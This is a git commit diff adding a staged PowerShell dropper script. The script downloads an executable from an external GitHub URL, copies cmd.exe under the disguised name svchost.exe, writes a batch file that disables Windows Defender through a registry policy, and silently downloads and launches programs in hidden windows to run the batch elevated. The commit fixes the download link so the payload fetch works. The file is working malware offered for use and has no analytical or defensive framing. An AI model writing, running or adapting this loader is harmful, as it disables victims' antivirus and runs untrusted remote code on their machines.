43dd88ed25d7d8a0c0375346e0d32efbd1dc1f5a
LO <lo@research.local>
2026-06-28 01:28:30 +0800

    Add stage1 and stage2 PowerShell scripts

--- stage2_full.ps1
+++ stage2_full.ps1
@@ -6,7 +6,7 @@ $c="$t\svchost.exe";
 $b="$t\run.bat";
 
 # Download method34.exe from your server
-(New-Object Net.WebClient).DownloadFile('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/blame/561e8bf0611a7695b3d644d65a524f2ee30f78db/method34.exe', $m);
+(New-Object Net.WebClient).DownloadFile('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/raw/main/method34.exe', $m);
 
 # Copy and rename cmd.exe
 Copy-Item "$env:SystemRoot\System32\cmd.exe" $c -Force;
@@ -16,8 +16,8 @@ Copy-Item "$env:SystemRoot\System32\cmd.exe" $c -Force;
 @echo off
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
 timeout /t 3 /nobreak >nul
-powershell -w hidden -c "(New-Object Net.WebClient).DownloadFile('http://dl.google.com/chrome/install/latest/chrome_installer.exe','$t\setup.exe');Start-Process '$t\setup.exe' /silent"
+powershell -w 0 -c "`$wc=New-Object Net.WebClient;`$wc.DownloadFile('http://dl.google.com/chrome/install/latest/chrome_installer.exe','$t\setup.exe');Start-Process '$t\setup.exe' /silent"
 "@ | Out-File $b -Encoding ASCII;
 
-# Run method34 with renamed cmd to execute the batch elevated
+# Run method34 with renamed cmd to execute the batch elevated - completely hidden
 Start-Process $m -ArgumentList "`"$c /c $b`"" -WindowStyle Hidden;
